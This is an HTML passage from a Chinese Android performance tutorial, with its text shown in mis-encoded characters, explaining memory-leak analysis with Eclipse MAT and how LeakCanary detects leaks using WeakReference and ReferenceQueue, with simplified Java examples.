<li>åŒå‡»ç±»åï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
</ul>
<p><strong>2. Dominator Treeï¼ˆæ”¯é…æ ‘ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºå¯¹è±¡çš„å¼•ç”¨å…³ç³»æ ‘ï¼Œæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Dominator Tree"è§†å›¾</li>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>å±•å¼€å¯¹è±¡ï¼ŒæŸ¥çœ‹å¼•ç”¨å…³ç³»</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
<p><strong>3. Path to GC Rootsï¼ˆåˆ°GC Rootsçš„è·¯å¾„ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºå¯¹è±¡åˆ°GC Rootsçš„å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>å³é”®ç‚¹å‡»å¯ç–‘å¯¹è±¡</li>
<li>é€‰æ‹©"Path to GC Roots"</li>
<li>é€‰æ‹©"exclude weak references"ï¼ˆæ’é™¤å¼±å¼•ç”¨ï¼‰</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šåˆ†æå†…å­˜æ³„æ¼çš„åŸå› </li>
</ul>
<p><strong>4. Leak Suspectsï¼ˆæ³„æ¼å«Œç–‘ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šMATè‡ªåŠ¨æ£€æµ‹å¯èƒ½çš„å†…å­˜æ³„æ¼ï¼Œç”Ÿæˆæ³„æ¼æŠ¥å‘Š</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Leak Suspects"è§†å›¾</li>
<li>æŸ¥çœ‹MATè‡ªåŠ¨æ£€æµ‹çš„æ³„æ¼æŠ¥å‘Š</li>
<li>æ ¹æ®æŠ¥å‘Šåˆ†ææ³„æ¼åŸå› </li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¿«é€Ÿå®šä½å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>5. OQLï¼ˆObject Query Languageï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šä½¿ç”¨ç±»ä¼¼SQLçš„æŸ¥è¯¢è¯­è¨€æŸ¥è¯¢å¯¹è±¡</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"OQL"è§†å›¾</li>
<li>è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼Œæ¯”å¦‚ï¼š
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> java.lang.String <span class="hljs-keyword">WHERE</span> this.value.length <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>
</code></pre>
</li>
<li>æ‰§è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥çœ‹ç»“æœ</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæŸ¥æ‰¾ç‰¹å®šæ¡ä»¶çš„å¯¹è±¡</li>
</ul>
<p><strong>MATåˆ†æå†…å­˜æ³„æ¼çš„è¯¦ç»†æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šæ‰“å¼€å †è½¬å‚¨æ–‡ä»¶</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€è½¬æ¢åçš„hprofæ–‡ä»¶</li>
<li>ç­‰å¾…MATåˆ†æå®Œæˆï¼ˆå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼‰</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šæŸ¥çœ‹Leak Suspectsï¼ˆæ¨èå…ˆçœ‹è¿™ä¸ªï¼‰</strong></p>
<ul>
<li>æ‰“å¼€"Leak Suspects"æ ‡ç­¾</li>
<li>æŸ¥çœ‹MATè‡ªåŠ¨æ£€æµ‹çš„æ³„æ¼æŠ¥å‘Š</li>
<li>æŠ¥å‘Šä¼šæ˜¾ç¤ºå¯ç–‘çš„æ³„æ¼å¯¹è±¡å’Œå¼•ç”¨é“¾</li>
<li>æ ¹æ®æŠ¥å‘Šå¿«é€Ÿå®šä½é—®é¢˜</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šä½¿ç”¨Histogramæ‰¾å‡ºå¤§å¯¹è±¡</strong></p>
<ul>
<li>æ‰“å¼€"Histogram"è§†å›¾</li>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>åŒå‡»ç±»åï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šä½¿ç”¨Dominator Treeåˆ†æå¯¹è±¡å…³ç³»</strong></p>
<ul>
<li>æ‰“å¼€"Dominator Tree"è§†å›¾</li>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>æŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li>å±•å¼€å¯¹è±¡ï¼ŒæŸ¥çœ‹å¼•ç”¨å…³ç³»</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šä½¿ç”¨Path to GC Rootsåˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li>åœ¨Histogramæˆ–Dominator Treeä¸­ï¼Œå³é”®ç‚¹å‡»å¯ç–‘å¯¹è±¡</li>
<li>é€‰æ‹©"Path to GC Roots" â†’ "exclude weak references"</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
<li>åˆ†æä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šåˆ†ææ³„æ¼åŸå› </strong></p>
<ul>
<li>æ ¹æ®å¼•ç”¨é“¾æ‰¾å‡ºæ³„æ¼åŸå› </li>
<li>å¸¸è§åŸå› ï¼š
<ul>
<li>é™æ€å˜é‡æŒæœ‰</li>
<li>ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œ</li>
<li>é›†åˆç±»æ³„æ¼</li>
<li>å…¶ä»–åŸå› </li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤7ï¼šå®šä½ä»£ç å¹¶ä¿®å¤</strong></p>
<ul>
<li>æ ¹æ®å¼•ç”¨é“¾ï¼Œå®šä½åˆ°ä»£ç ä¸­çš„é—®é¢˜</li>
<li>ä¿®å¤ä»£ç ï¼ˆä½¿ç”¨å¼±å¼•ç”¨ã€åŠæ—¶æ¸…ç†ç­‰ï¼‰</li>
</ul>
<p><strong>MATåˆ†ææŠ€å·§ï¼š</strong></p>
<p><strong>1. å¯¹æ¯”å¤šä¸ªå †è½¬å‚¨</strong></p>
<ul>
<li>ç”Ÿæˆå¤šä¸ªæ—¶é—´ç‚¹çš„å †è½¬å‚¨</li>
<li>å¯¹æ¯”åˆ†æï¼Œæ‰¾å‡ºå†…å­˜å¢é•¿çš„åŸå› </li>
<li>å¯ä»¥çœ‹åˆ°å“ªäº›å¯¹è±¡åœ¨å¢é•¿</li>
</ul>
<p><strong>2. ä½¿ç”¨OQLæŸ¥è¯¢</strong></p>
<ul>
<li>ä½¿ç”¨OQLæŸ¥è¯¢ç‰¹å®šå¯¹è±¡</li>
<li>æ¯”å¦‚ï¼šæŸ¥è¯¢æ‰€æœ‰Activityå®ä¾‹</li>
<li>åˆ†æè¿™äº›å¯¹è±¡æ˜¯å¦åº”è¯¥å­˜åœ¨</li>
</ul>
<p><strong>3. å…³æ³¨Retained Heap</strong></p>
<ul>
<li>Retained Heapè¡¨ç¤ºå¯¹è±¡åŠå…¶å¼•ç”¨çš„å¯¹è±¡å ç”¨çš„æ€»å†…å­˜</li>
<li>å…³æ³¨Retained Heapå¤§çš„å¯¹è±¡</li>
<li>è¿™äº›å¯¹è±¡å¯èƒ½æ˜¯å†…å­˜æ³„æ¼çš„æ ¹æº</li>
</ul>
<p><strong>4. æ’é™¤å¼±å¼•ç”¨</strong></p>
<ul>
<li>åœ¨Path to GC Rootsæ—¶ï¼Œé€‰æ‹©"exclude weak references"</li>
<li>å¼±å¼•ç”¨ä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«å›æ”¶ï¼Œå¯ä»¥æ’é™¤</li>
<li>åªå…³æ³¨å¼ºå¼•ç”¨ï¼Œæ‰¾å‡ºçœŸæ­£çš„æ³„æ¼åŸå› </li>
</ul>
<p><strong>MATå®é™…æ“ä½œç¤ºä¾‹ï¼š</strong></p>
<p><strong>åœºæ™¯ï¼šåˆ†æActivityæ³„æ¼</strong></p>
<p><strong>æ­¥éª¤1ï¼šåœ¨Android Studioä¸­ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>æ‰“å¼€Profiler</li>
<li>é€‰æ‹©åº”ç”¨è¿›ç¨‹</li>
<li>ç‚¹å‡»"Heap Dump"æŒ‰é’®</li>
<li>ç­‰å¾…ç”Ÿæˆå®Œæˆ</li>
<li>ç‚¹å‡»"Export heap dump"å¯¼å‡ºä¸ºheap.hprof</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šè½¬æ¢hprofæ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‰¾åˆ°hprof-convå·¥å…·ï¼ˆåœ¨Android SDKçš„platform-toolsç›®å½•ï¼‰</span>
<span class="hljs-comment"># Windows</span>
C:\Users\ä½ çš„ç”¨æˆ·å\AppData\Local\Android\Sdk\platform-tools\hprof-conv.exe heap.hprof heap-converted.hprof

<span class="hljs-comment"># Mac/Linux</span>
~/Library/Android/sdk/platform-tools/hprof-conv heap.hprof heap-converted.hprof
</code></pre>
<p><strong>æ­¥éª¤3ï¼šç”¨MATæ‰“å¼€</strong></p>
<ul>
<li>æ‰“å¼€MAT</li>
<li>ç‚¹å‡»"File" â†’ "Open Heap Dump"</li>
<li>é€‰æ‹©heap-converted.hprof</li>
<li>ç­‰å¾…åˆ†æå®Œæˆ</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šæŸ¥æ‰¾æ³„æ¼çš„Activity</strong></p>
<ul>
<li>æ‰“å¼€"Histogram"è§†å›¾</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥"Activity"</li>
<li>æ‰¾åˆ°MyActivityç±»</li>
<li>æŸ¥çœ‹å®ä¾‹æ•°é‡ï¼ˆæ­£å¸¸åº”è¯¥æ˜¯0æˆ–1ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œå¯èƒ½æœ‰æ³„æ¼ï¼‰</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šåˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li>å³é”®ç‚¹å‡»MyActivityå®ä¾‹</li>
<li>é€‰æ‹©"Path to GC Roots" â†’ "exclude weak references"</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼š
<pre><code class="hljs language-scss" lang="scss">MyActivityå®ä¾‹
  â†‘ (è¢«å¼•ç”¨)
static MyActivity<span class="hljs-selector-class">.activity</span> (é™æ€å˜é‡)
  â†‘ (GC Root)
</code></pre>
</li>
<li>æ‰¾å‡ºæ˜¯é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šå®šä½ä»£ç </strong></p>
<ul>
<li>æ ¹æ®å¼•ç”¨é“¾ï¼Œå®šä½åˆ°ä»£ç ä¸­çš„é™æ€å˜é‡</li>
<li>ä¿®å¤ä»£ç ï¼š
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨å¼±å¼•ç”¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> WeakReference&lt;Activity&gt; activityRef;
</code></pre>
</li>
</ul>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>è¯¦ç»†åˆ†æå†…å­˜æ³„æ¼</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li>åˆ†æå¯¹è±¡å¼•ç”¨å…³ç³»</li>
<li>æ’æŸ¥OOMé—®é¢˜</li>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<h4 data-id="heading-67">5.1.5 LeakCanaryï¼ˆè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> è‡ªåŠ¨æ£€æµ‹åº”ç”¨ä¸­çš„å†…å­˜æ³„æ¼ï¼Œæ— éœ€æ‰‹åŠ¨åˆ†æ</p>
<p><strong>LeakCanaryæ˜¯ä»€ä¹ˆï¼š</strong></p>
<ul>
<li>Squareå…¬å¸å¼€å‘çš„å†…å­˜æ³„æ¼æ£€æµ‹åº“</li>
<li>ä¸“é—¨ç”¨äºAndroidåº”ç”¨çš„å†…å­˜æ³„æ¼æ£€æµ‹</li>
<li>åœ¨å¼€å‘é˜¶æ®µè‡ªåŠ¨æ£€æµ‹ï¼Œå‘ç°æ³„æ¼æ—¶æ˜¾ç¤ºé€šçŸ¥</li>
</ul>
<p><strong>æ ¸å¿ƒæ£€æµ‹åŸç†ï¼ˆè¯¦ç»†è¯´æ˜ï¼‰ï¼š</strong></p>
<p>LeakCanaryçš„æ£€æµ‹åŸç†åŸºäº**WeakReferenceï¼ˆå¼±å¼•ç”¨ï¼‰å’ŒReferenceQueueï¼ˆå¼•ç”¨é˜Ÿåˆ—ï¼‰**çš„æœºåˆ¶ã€‚</p>
<p><strong>1. WeakReferenceï¼ˆå¼±å¼•ç”¨ï¼‰çš„å·¥ä½œåŸç†</strong></p>
<p><strong>ä»€ä¹ˆæ˜¯WeakReferenceï¼š</strong></p>
<ul>
<li>WeakReferenceæ˜¯Javaä¸­çš„ä¸€ç§å¼•ç”¨ç±»å‹</li>
<li>å¼±å¼•ç”¨ä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«GCå›æ”¶</li>
<li>å½“å¯¹è±¡åªæœ‰å¼±å¼•ç”¨æ—¶ï¼ŒGCä¼šå›æ”¶è¿™ä¸ªå¯¹è±¡</li>
</ul>
<p><strong>WeakReferenceçš„ç‰¹ç‚¹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå¼±å¼•ç”¨</span>
WeakReference&lt;Activity&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);

<span class="hljs-comment">// è·å–å¯¹è±¡ï¼ˆå¯èƒ½è¿”å›nullï¼Œå¦‚æœå¯¹è±¡å·²è¢«å›æ”¶ï¼‰</span>
<span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> ref.get();

<span class="hljs-comment">// å¦‚æœactivityè¢«GCå›æ”¶ï¼Œref.get()ä¼šè¿”å›null</span>
</code></pre>
<p><strong>2. ReferenceQueueï¼ˆå¼•ç”¨é˜Ÿåˆ—ï¼‰çš„å·¥ä½œåŸç†</strong></p>
<p><strong>ä»€ä¹ˆæ˜¯ReferenceQueueï¼š</strong></p>
<ul>
<li>ReferenceQueueæ˜¯Javaä¸­çš„å¼•ç”¨é˜Ÿåˆ—</li>
<li>å½“WeakReferenceå¼•ç”¨çš„å¯¹è±¡è¢«GCå›æ”¶æ—¶ï¼ŒWeakReferenceä¼šè¢«æ”¾å…¥ReferenceQueue</li>
<li>é€šè¿‡æ£€æŸ¥ReferenceQueueï¼Œå¯ä»¥çŸ¥é“å¯¹è±¡æ˜¯å¦è¢«å›æ”¶</li>
</ul>
<p><strong>ReferenceQueueçš„å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-number">1.</span> åˆ›å»ºWeakReferenceæ—¶ï¼Œå¯ä»¥æŒ‡å®šReferenceQueue
   WeakReference&lt;Activity&gt; ref = <span class="hljs-keyword">new</span> WeakReference&lt;&gt;(activity, queue);

<span class="hljs-number">2.</span> å½“activityè¢«GCå›æ”¶æ—¶ï¼Œrefä¼šè¢«è‡ªåŠ¨æ”¾å…¥queue

<span class="hljs-number">3.</span> æ£€æŸ¥queueï¼Œå¦‚æœrefåœ¨queueä¸­ï¼Œè¯´æ˜activityå·²è¢«å›æ”¶
   Reference&lt;?&gt; polled = queue.<span class="hljs-built_in">poll</span>();
   <span class="hljs-keyword">if</span> (polled != null) {
       <span class="hljs-comment">// å¯¹è±¡å·²è¢«å›æ”¶</span>
   }
</code></pre>
<p><strong>3. LeakCanaryçš„å®Œæ•´æ£€æµ‹æµç¨‹</strong></p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šç›‘æ§å¯¹è±¡ç”Ÿå‘½å‘¨æœŸ</strong></p>
<ul>
<li>LeakCanaryé€šè¿‡Application.ActivityLifecycleCallbacksç›‘æ§Activityçš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>å½“Activityçš„onDestroy()è¢«è°ƒç”¨æ—¶ï¼ŒLeakCanaryå¼€å§‹æ£€æµ‹</li>
</ul>
<p><strong>ç¬¬äºŒæ­¥ï¼šåˆ›å»ºå¼±å¼•ç”¨å’Œå¼•ç”¨é˜Ÿåˆ—</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// LeakCanaryå†…éƒ¨å®ç°ï¼ˆç®€åŒ–ï¼‰</span>
ReferenceQueue&lt;Activity&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceQueue</span>&lt;&gt;();
WeakReference&lt;Activity&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity, queue);
</code></pre>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šç­‰å¾…GC</strong></p>
<ul>
<li>LeakCanaryç­‰å¾…5ç§’ï¼ˆç»™GCæ—¶é—´ï¼‰</li>
<li>ç„¶åè§¦å‘ä¸€æ¬¡GCï¼ˆSystem.gc()ï¼‰</li>
<li>å†ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œè®©GCå®Œæˆ</li>
</ul>
<p><strong>ç¬¬å››æ­¥ï¼šæ£€æŸ¥å¯¹è±¡æ˜¯å¦è¢«å›æ”¶</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ£€æŸ¥ReferenceQueue</span>
Reference&lt;?&gt; polled = queue.poll();
<span class="hljs-keyword">if</span> (polled != <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// å¯¹è±¡å·²è¢«å›æ”¶ï¼Œæ²¡æœ‰å†…å­˜æ³„æ¼</span>
} <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// å¯¹è±¡æ²¡æœ‰è¢«å›æ”¶ï¼Œå¯èƒ½æœ‰å†…å­˜æ³„æ¼</span>
    <span class="hljs-comment">// éœ€è¦è¿›ä¸€æ­¥ç¡®è®¤</span>
}
</code></pre>
<p><strong>ç¬¬äº”æ­¥ï¼šç¡®è®¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>å¦‚æœå¯¹è±¡æ²¡æœ‰è¢«å›æ”¶ï¼ŒLeakCanaryä¼šå†æ¬¡è§¦å‘GC</li>
<li>å¦‚æœå¤šæ¬¡GCåå¯¹è±¡ä»ç„¶æ²¡æœ‰è¢«å›æ”¶ï¼Œç¡®è®¤æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>ç¬¬å…­æ­¥ï¼šç”Ÿæˆå †è½¬å‚¨å¹¶åˆ†æ</strong></p>
<ul>
<li>å¦‚æœç¡®è®¤æœ‰å†…å­˜æ³„æ¼ï¼ŒLeakCanaryä¼šç”Ÿæˆå †è½¬å‚¨</li>
<li>åˆ†æå¯¹è±¡çš„å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
<li>æ˜¾ç¤ºæ³„æ¼è·¯å¾„ï¼Œå¸®åŠ©å¼€å‘è€…å¿«é€Ÿå®šä½é—®é¢˜</li>
</ul>
<p><strong>å®Œæ•´æ£€æµ‹æµç¨‹ï¼ˆæ—¶é—´çº¿ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">æ—¶é—´ç‚¹<span class="hljs-number">0</span>ï¼šActivity.<span class="hljs-built_in">onDestroy</span>()è¢«è°ƒç”¨
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">1</span>ï¼šLeakCanaryåˆ›å»ºWeakReferenceæŒ‡å‘Activity
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">2</span>ï¼šç­‰å¾…<span class="hljs-number">5</span>ç§’ï¼ˆç»™GCæ—¶é—´ï¼‰
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">3</span>ï¼šè§¦å‘GCï¼ˆSystem.<span class="hljs-built_in">gc</span>()ï¼‰
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">4</span>ï¼šç­‰å¾…GCå®Œæˆ
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">5</span>ï¼šæ£€æŸ¥ReferenceQueue
         â†“
         â”œâ”€ å¦‚æœrefåœ¨queueä¸­ â†’ Activityå·²è¢«å›æ”¶ â†’ æ²¡æœ‰æ³„æ¼
         â””â”€ å¦‚æœrefä¸åœ¨queueä¸­ â†’ Activityæ²¡æœ‰è¢«å›æ”¶ â†’ å¯èƒ½æœ‰æ³„æ¼
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">6</span>ï¼šå¦‚æœå¯èƒ½æœ‰æ³„æ¼ï¼Œå†æ¬¡è§¦å‘GCç¡®è®¤
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">7</span>ï¼šå¦‚æœç¡®è®¤æ³„æ¼ï¼Œç”Ÿæˆå †è½¬å‚¨å¹¶åˆ†æ
         â†“
æ—¶é—´ç‚¹<span class="hljs-number">8</span>ï¼šæ˜¾ç¤ºæ³„æ¼é€šçŸ¥å’Œæ³„æ¼è·¯å¾„
</code></pre>
<p><strong>æ ¸å¿ƒä»£ç åŸç†ï¼ˆè¯¦ç»†ç‰ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// LeakCanaryçš„æ ¸å¿ƒåŸç†ï¼ˆè¯¦ç»†ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LeakCanary</span> {
    <span class="hljs-keyword">private</span> ReferenceQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceQueue</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">watch</span><span class="hljs-params">(Object object)</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºå¼±å¼•ç”¨ï¼ŒæŒ‡å®šå¼•ç”¨é˜Ÿåˆ—</span>
        WeakReference&lt;Object&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(object, queue);
        
        <span class="hljs-comment">// 2. ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç»™GCæ—¶é—´</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">5000</span>);  <span class="hljs-comment">// ç­‰å¾…5ç§’</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
        
        <span class="hljs-comment">// 3. è§¦å‘GC</span>
        System.gc();
        
        <span class="hljs-comment">// 4. å†ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œè®©GCå®Œæˆ</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);  <span class="hljs-comment">// ç­‰å¾…1ç§’</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
        
        <span class="hljs-comment">// 5. æ£€æŸ¥ReferenceQueue</span>
        Reference&lt;?&gt; polled = queue.poll();
        <span class="hljs-keyword">if</span> (polled != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å¯¹è±¡å·²è¢«å›æ”¶ï¼Œæ²¡æœ‰å†…å­˜æ³„æ¼</span>
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 6. å¦‚æœå¯¹è±¡æ²¡æœ‰è¢«å›æ”¶ï¼Œå†æ¬¡ç¡®è®¤</span>
        <span class="hljs-keyword">if</span> (ref.get() != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å¯¹è±¡æ²¡æœ‰è¢«å›æ”¶ï¼Œç¡®è®¤æœ‰å†…å­˜æ³„æ¼</span>
            <span class="hljs-comment">// ç”Ÿæˆå †è½¬å‚¨å¹¶åˆ†æ</span>
            analyzeLeak(object);
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">analyzeLeak</span><span class="hljs-params">(Object object)</span> {
        <span class="hljs-comment">// ç”Ÿæˆå †è½¬å‚¨</span>
        <span class="hljs-type">HeapDump</span> <span class="hljs-variable">heapDump</span> <span class="hljs-operator">=</span> generateHeapDump();
        
        <span class="hljs-comment">// åˆ†æå¼•ç”¨é“¾</span>
        <span class="hljs-type">LeakTrace</span> <span class="hljs-variable">leakTrace</span> <span class="hljs-operator">=</span> findLeakTrace(heapDump, object);
        
        <span class="hljs-comment">// æ˜¾ç¤ºæ³„æ¼é€šçŸ¥</span>
        showLeakNotification(leakTrace);
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆWeakReferenceèƒ½æ£€æµ‹å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>åŸç†è¯´æ˜ï¼š</strong></p>
<ol>
<li>
<p><strong>æ­£å¸¸æƒ…å†µï¼ˆæ²¡æœ‰æ³„æ¼ï¼‰</strong>ï¼š</p>
<ul>
<li>Activity.onDestroy()åï¼ŒActivityåº”è¯¥ä¸å†è¢«å¼•ç”¨</li>
<li>GCæ—¶ï¼ŒActivityä¼šè¢«å›æ”¶</li>
<li>WeakReferenceä¼šè¢«æ”¾å…¥ReferenceQueue</li>
<li>æ£€æŸ¥ReferenceQueueï¼Œå‘ç°refåœ¨queueä¸­ï¼Œè¯´æ˜Activityå·²è¢«å›æ”¶</li>
</ul>
</li>
<li>
<p><strong>å¼‚å¸¸æƒ…å†µï¼ˆæœ‰æ³„æ¼ï¼‰</strong>ï¼š</p>
<ul>
<li>Activity.onDestroy()åï¼ŒActivityä»ç„¶è¢«æŸä¸ªå¯¹è±¡å¼•ç”¨ï¼ˆæ¯”å¦‚é™æ€å˜é‡ï¼‰</li>
<li>GCæ—¶ï¼ŒActivityå› ä¸ºæœ‰å¼ºå¼•ç”¨ï¼Œä¸ä¼šè¢«å›æ”¶</li>
<li>WeakReferenceä¸ä¼šè¢«æ”¾å…¥ReferenceQueue</li>
<li>æ£€æŸ¥ReferenceQueueï¼Œå‘ç°refä¸åœ¨queueä¸­ï¼Œè¯´æ˜Activityæ²¡æœ‰è¢«å›æ”¶</li>
<li>ç¡®è®¤æœ‰å†…å­˜æ³„æ¼</li>
</ul>
</li>
</ol>
<p><strong>å¼•ç”¨é“¾åˆ†æåŸç†ï¼š</strong></p>
<p>å½“LeakCanaryç¡®è®¤æœ‰å†…å­˜æ³„æ¼åï¼Œä¼šï¼š</p>
<ol>
<li><strong>ç”Ÿæˆå †è½¬å‚¨</strong>ï¼šä¿å­˜å½“å‰æ‰€æœ‰å¯¹è±¡çš„å†…å­˜å¿«ç…§</li>
<li><strong>åˆ†æå¼•ç”¨é“¾</strong>ï¼šä»æ³„æ¼å¯¹è±¡å¼€å§‹ï¼Œå‘ä¸ŠæŸ¥æ‰¾å¼•ç”¨é“¾</li>
<li><strong>æ‰¾å‡ºæ³„æ¼è·¯å¾„</strong>ï¼šæ‰¾å‡ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
</ol>
